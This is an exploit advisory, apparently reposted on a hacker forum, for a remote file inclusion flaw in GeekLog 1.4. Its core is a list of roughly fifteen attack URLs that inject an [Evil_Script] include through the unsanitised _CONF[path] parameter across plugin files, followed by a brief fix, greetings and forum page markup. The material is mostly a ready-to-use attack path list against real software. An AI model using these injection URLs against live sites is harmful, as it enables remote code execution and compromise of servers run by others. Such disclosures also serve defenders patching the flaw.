Discovered By Kw3&#91;R&#93;Ln &#91; Romanian Security Team &#93; :<span class="link"> hTTp://RoSecurityGroup.net</span> :
Remote : Yes
Critical Level : Dangerous
---------------------------------------------------------------------------
Affected software description :
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Application : GeekLog
version : latest version &#91; 1.4 &#93;
URL :<span class="link"> http://www.geeklog.net/</span>
------------------------------------------------------------------
Exploit:
~~~~~~~~
Variable $_CONF&#91;path&#93; not sanitized.When register_globals=on an attacker can exploit this vulnerability with a simple php injection script.
were &#91;path&#93; on some cases =&gt; www.site.com/&#91;path&#93;/public_html/index.php
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/links/functions.inc?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/polls/functions.inc?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/BlackList.Examine.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/DeleteComment.Action.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/EditIPofURL.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/MTBlackList.Examine.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/MassDelete.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/MailAdmin.Action.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#http://www.site.com/&#91;path&#93;/plugins/spamx/MassDelTrackback.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/EditHeader.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/EditIP.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/IPofUrl.Examine.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/Import.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/spamx/LogView.Admin.class.php?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
#<span class="link"> http://www.site.com/&#91;path&#93;/plugins/staticpages/functions.inc?_CONF&#91;path&#93;=&#91;Evil_Script&#93;</span>
---------------------------------------------------------------------------
Solution :
~~~~~~~~~~
declare variabel $_CONF&#91;path&#93;
---------------------------------------------------------------------------
Shoutz:
~~~~~~
# Special greetz to my good friend &#91;Oo&#93;
# To all members of h4cky0u.org ;&#41; and RST &#91;<span class="link"> hTTp://RoSecurityGroup.net</span> &#93;
---------------------------------------------------------------------------</pre>
</div><br/><br/><br/><br/> Contact:<br/> ~~~~~~~~<br/><br/> Nick: Kw3rLn<br/> E-mail: ciriboflacs[at]YaHoo[dot]Com<br/> Homepage:<span class="link"> hTTp://RoSecurityGroup.net</span><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right"></td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.html" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
